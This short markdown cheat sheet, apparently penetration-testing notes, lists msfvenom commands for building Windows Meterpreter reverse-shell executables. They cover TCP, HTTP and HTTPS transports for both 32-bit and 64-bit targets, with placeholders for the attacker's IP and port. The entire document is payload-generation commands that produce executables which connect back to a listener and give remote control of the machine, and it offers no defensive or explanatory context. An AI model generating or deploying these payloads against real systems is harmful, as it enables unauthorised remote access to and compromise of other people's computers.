# Reverse Shells

1. **x86 (32-bit) Payloads**

`$ msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`

`$ msfvenom -p windows/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`

`$ msfvenom -p windows/meterpreter_reverse_https handlersslcert=<file.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`

2. **x86-64 (64-bit) Payloads**

`$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86-64.exe`

`$ msfvenom -p windows/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x86-64.exe`

`$ msfvenom -p windows/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met-x64.exe`